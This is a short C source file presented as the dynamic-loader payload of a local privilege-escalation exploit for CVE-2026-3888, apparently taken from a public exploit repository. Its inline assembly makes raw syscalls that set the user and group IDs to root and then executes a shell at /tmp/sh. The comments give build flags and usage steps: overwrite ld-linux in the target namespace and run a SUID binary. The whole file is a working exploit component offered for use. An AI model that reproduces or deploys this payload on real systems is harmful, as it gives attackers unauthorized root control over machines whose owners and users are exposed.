/*
 * librootshell.c-Dynamic loader payload for CVE-2026-3888
 *
 https://raw.githubusercontent.com/nomaisthere/CVE-2026-3888/refs/heads/main/src/librootshell.c
 *
 * Build:
 *   gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell.c
 *
 * Usage:
 *   Overwrite ld-linux in target namespace, then run a SUID binary.
 */

void _start(void) {

    /* setreuid(0,0): make ruid/euid both root */
    __asm__ volatile (
        "xor %%rdi, %%rdi\n"
        "xor %%rsi, %%rsi\n"
        "mov $0x71, %%rax\n"
        "syscall\n"
        ::: "rax", "rdi", "rsi"
    );

    /* setregid(0,0): ensure root gid */
    __asm__ volatile (
        "xor %%rdi, %%rdi\n"
        "xor %%rsi, %%rsi\n"
        "mov $0x72, %%rax\n"
        "syscall\n"
        ::: "rax", "rdi", "rsi"
    );

    /*
     * execve("/tmp/sh", ...):
     * execute static shell (no ld-linux dependency)
     */
    __asm__ volatile (
        "mov $0x68732f706d742f, %%rax\n"
        "push %%rax\n"
        "mov %%rsp, %%rdi\n"
        "push $0\n"
        "push %%rdi\n"
        "mov %%rsp, %%rsi\n"
        "xor %%rdx, %%rdx\n"
        "mov $0x3b, %%rax\n"
        "syscall\n"
        ::: "rax", "rdi", "rsi", "rdx"
    );

    /* execve should not return; failure likely crashes */
}
